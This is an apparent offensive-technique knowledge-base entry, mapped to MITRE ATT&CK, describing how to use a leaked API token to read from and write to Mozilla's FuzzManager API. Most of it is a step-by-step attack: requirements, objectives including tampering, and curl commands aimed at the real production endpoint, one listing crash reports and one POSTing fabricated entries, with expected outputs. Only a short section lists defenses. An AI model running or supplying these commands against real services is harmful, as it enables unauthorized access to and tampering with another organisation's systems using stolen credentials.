---
id: proc-access-fuzzmanager-api-001
tags:
  - api-access
  - unauthorized-access
  - token-exploitation
  - data-collection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-api-read]]'
  - '[[commands/curl-api-write]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:38.882Z'
skill_level: basic
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Access FuzzManager API with Stolen Token

## Summary

This procedure uses a leaked API token to authenticate and perform read-write operations on Mozilla's FuzzManager API, enabling unauthorized access to internal fuzzing data and results.

## Description

Once a valid API token is obtained from a leaked source, it can be used in HTTP Authorization headers to interact with the FuzzManager service at https://fuzzmanager.fuzzing.mozilla.org/. The token provides read access to crash reports and fuzzing results, and write access to submit or modify data. This was the impact in the Mozilla incident, where the token's exposure allowed full compromise of internal fuzzing infrastructure. Prerequisites: Valid token string; no additional auth needed.

## Requirements

1. Leaked API token with read-write permissions
2. Network access to the target API endpoint (HTTPS)
3. curl or similar HTTP client

## Defense

Defensive measures and detection strategies:

- Configure API tokens as read-only where possible
- Implement rate limiting and IP whitelisting on APIs
- Monitor for unusual API calls from unknown sources
- Use token rotation and revocation upon leak detection

## Objectives

1. Authenticate to the FuzzManager API using the stolen token
2. Retrieve sensitive fuzzing data
3. Demonstrate write capabilities for potential tampering

## Instructions

### Step 1: Test Read Access

**Context**: Verify the token's validity by querying the API for existing data.

**Command** ([[commands/curl-api-read]]):
```bash
curl -H "Authorization: Token YOUR_LEAKED_TOKEN" https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

> This fetches a list of crashes. Expected output: JSON array of fuzzing records, e.g., [{"id":1, "signature":"crash@sig"}].

### Step 2: Attempt Write Access

**Context**: Confirm full permissions by submitting new data to the API.

**Command** ([[commands/curl-api-write]]):
```bash
curl -X POST -H "Authorization: Token YOUR_LEAKED_TOKEN" -d '{"platform":"test", "signature":"test@sig"}' https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

> This creates a new crash entry. Expected output: HTTP 201 Created with new resource ID.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/curl-api-read]]
- [[commands/curl-api-write]]

## Tools Used


## Tags

- api-access
- unauthorized-access
- token-exploitation
